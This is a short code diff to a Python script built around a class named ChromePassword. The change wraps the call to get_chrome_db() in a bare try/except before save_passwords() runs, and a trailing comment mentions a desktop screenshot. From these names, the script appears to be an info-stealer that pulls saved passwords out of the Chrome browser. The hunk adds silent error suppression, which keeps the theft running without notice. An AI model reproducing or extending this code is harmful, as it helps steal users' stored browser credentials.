@@ -176,7 +176,10 @@ class ChromePassword:
 
 if __name__ == "__main__":
     Main = ChromePassword()
-    Main.get_chrome_db()
+    try:
+        Main.get_chrome_db()
+    except:
+        pass
     Main.save_passwords()
 
 # DESKTOP SCREENSHOT :
